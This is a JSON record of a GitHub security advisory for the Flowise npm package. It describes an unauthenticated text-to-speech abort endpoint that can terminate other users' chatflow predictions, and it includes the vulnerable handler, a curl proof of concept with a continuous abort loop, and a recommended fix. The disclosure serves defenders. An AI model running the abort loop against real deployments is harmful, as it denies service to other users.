@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-xhxx-56g3-mx2r",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 6.3,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-862"
+    ],
+    "description": "## Summary\r\n\r\nThe `/api/v1/text-to-speech/abort` endpoint is whitelisted (requires no authentication) and accepts user-supplied `chatflowId`, `chatId`, and `chatMessageId` values without ownership verification. Beyond aborting TTS audio streams, the handler also aborts the main chatflow AbortController for the referenced prediction session. An unauthenticated attacker who knows a `chatflowId` and `chatId` can terminate any in-progress chatflow prediction for any user, causing a targeted denial of service.\r\n\r\n## Details\r\n\r\nThe TTS abort controller at `packages/server/src/controllers/text-to-speech/index.ts:173-220` is whitelisted at `packages/server/src/utils/constants.ts:42`:\r\n\r\n```typescript\r\n'/api/v1/text-to-speech/abort',\r\n```\r\n\r\nThe handler extracts `chatflowId`, `chatId`, and `chatMessageId` from the request body and uses them to:\r\n1. Abort the TTS-specific AbortController\r\n2. Abort the MAIN chatflow AbortController for the prediction session\r\n\r\n```typescript\r\n// packages/server/src/controllers/text-to-speech/index.ts:173-214\r\nconst abortTextToSpeech = async (req: Request, res: Response) => {\r\n    try {\r\n        const { chatId, chatMessageId, chatflowId } = req.body\r\n\r\n        // ... basic field validation ...\r\n\r\n        const appServer = getRunningExpressApp()\r\n\r\n        // Abort the TTS generation using existing pool\r\n        const ttsAbortId = `tts_${chatId}_${chatMessageId}`\r\n        appServer.abortControllerPool.abort(ttsAbortId)\r\n\r\n        // Also abort the main chat flow AbortController for auto-TTS\r\n        const chatFlowAbortId = `${chatflowId}_${chatId}`\r\n        if (appServer.abortControllerPool.get(chatFlowAbortId)) {\r\n            appServer.abortControllerPool.abort(chatFlowAbortId)  // <-- Kills the active prediction\r\n            appServer.sseStreamer.streamMetadataEvent(chatId, { chatId, chatMessageId })\r\n        }\r\n\r\n        // Send abort event to client\r\n        appServer.sseStreamer.streamTTSAbortEvent(chatId, chatMessageId)\r\n\r\n        res.json({ message: 'TTS stream aborted successfully', chatId, chatMessageId })\r\n    } catch (error) {\r\n        res.status(500).json({\r\n            error: error instanceof Error ? error.message : 'Failed to abort TTS stream'\r\n        })\r\n    }\r\n}\r\n```\r\n\r\nAt lines 205-208, when the main chatflow AbortController is found in the pool, it is aborted. The chatflow AbortController ID is constructed as `${chatflowId}_${chatId}`, where both values come directly from the unauthenticated request body. There is no verification that:\r\n1. The request originates from the same user who initiated the prediction\r\n2. The chatflow is public\r\n3. The caller has any relationship to the chatflow or chat session\r\n\r\nThe `chatId` for public chatflows is either user-provided at prediction time (from `req.body.chatId`) or auto-generated. For embedded chatbot widgets, the `chatId` is typically generated client-side and visible in the JavaScript source or network traffic.\r\n\r\n## PoC\r\n\r\n```bash\r\n# Step 1: Attacker knows a chatflow UUID (from widget source, URL, etc.)\r\nCHATFLOW_ID=\"<target-chatflow-uuid>\"\r\n\r\n# Step 2: Attacker observes or guesses a chatId from the target user's session\r\n# For embedded widgets, chatId is often visible in client-side JS or SSE streams\r\nCHAT_ID=\"<target-chat-id>\"\r\n\r\n# Step 3: Abort the active prediction session without authentication\r\ncurl -X POST \"http://localhost:3000/api/v1/text-to-speech/abort\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\r\n    \"chatflowId\": \"'${CHATFLOW_ID}'\",\r\n    \"chatId\": \"'${CHAT_ID}'\",\r\n    \"chatMessageId\": \"arbitrary-msg-id\"\r\n  }'\r\n\r\n# Expected: Returns 200 with \"TTS stream aborted successfully\"\r\n# Effect: The target user's in-progress prediction is terminated mid-generation\r\n\r\n# Step 4: Automated disruption - continuously abort any prediction as it starts\r\nwhile true; do\r\n  curl -s -X POST \"http://localhost:3000/api/v1/text-to-speech/abort\" \\\r\n    -H \"Content-Type: application/json\" \\\r\n    -d '{\"chatflowId\": \"'${CHATFLOW_ID}'\", \"chatId\": \"'${CHAT_ID}'\", \"chatMessageId\": \"dos\"}' > /dev/null\r\n  sleep 0.1\r\ndone\r\n```\r\n\r\n## Impact\r\n\r\n- **Targeted Denial of Service**: An attacker can terminate any in-progress chatflow prediction for any user by calling the unauthenticated TTS abort endpoint with the correct chatflowId and chatId. This interrupts the LLM response mid-generation, causing the user to see an incomplete or error response.\r\n- **Persistent Disruption**: By continuously calling the abort endpoint in a loop, an attacker can make a specific chatflow unusable for a specific user session, as every prediction will be aborted before completion.\r\n- **Cross-Session Impact**: The abort event is also sent via SSE to the chat client (`streamTTSAbortEvent` and `streamMetadataEvent`), potentially disrupting the client-side UI state.\r\n- **No Rate Limiting**: The TTS abort endpoint does not appear to have rate limiting applied, allowing high-frequency abuse.\r\n\r\n## Recommended Fix\r\n\r\nAdd authorization checks to the TTS abort endpoint:\r\n\r\n```typescript\r\n// packages/server/src/controllers/text-to-speech/index.ts\r\nconst abortTextToSpeech = async (req: Request, res: Response) => {\r\n    try {\r\n        const { chatId, chatMessageId, chatflowId } = req.body\r\n\r\n        // ... existing field validation ...\r\n\r\n        // For unauthenticated requests, verify the chatflow is public\r\n        if (!req.user) {\r\n            const chatflow = await chatflowsService.getChatflowById(chatflowId)\r\n            if (!chatflow || !chatflow.isPublic) {\r\n                throw new InternalFlowiseError(\r\n                    StatusCodes.UNAUTHORIZED,\r\n                    'TTS abort requires authentication for non-public chatflows'\r\n                )\r\n            }\r\n        }\r\n\r\n        const appServer = getRunningExpressApp()\r\n\r\n        // Only abort the TTS-specific controller, NOT the main chatflow controller\r\n        const ttsAbortId = `tts_${chatId}_${chatMessageId}`\r\n        appServer.abortControllerPool.abort(ttsAbortId)\r\n\r\n        // Remove or protect the main chatflow abort\r\n        // The main chatflow abort should only be callable by authenticated users\r\n        // who own the chatflow or are in the same workspace\r\n\r\n        res.json({ message: 'TTS stream aborted successfully', chatId, chatMessageId })\r\n    } catch (error) {\r\n        res.status(500).json({\r\n            error: error instanceof Error ? error.message : 'Failed to abort TTS stream'\r\n        })\r\n    }\r\n}\r\n```\r\n",
+    "ghsa_id": "GHSA-xhxx-56g3-mx2r",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-xhxx-56g3-mx2r",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-xhxx-56g3-mx2r"
+      }
+    ],
+    "published_at": "2026-08-28T14:03:14Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Unauthenticated Denial of Service via text-to-speech/abort Endpoint Allows Termination of Active Chatflow Predictions",
+    "updated_at": "2026-08-28T14:03:14Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "3.1.4",
+        "vulnerable_version_range": "<= 3.1.3"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
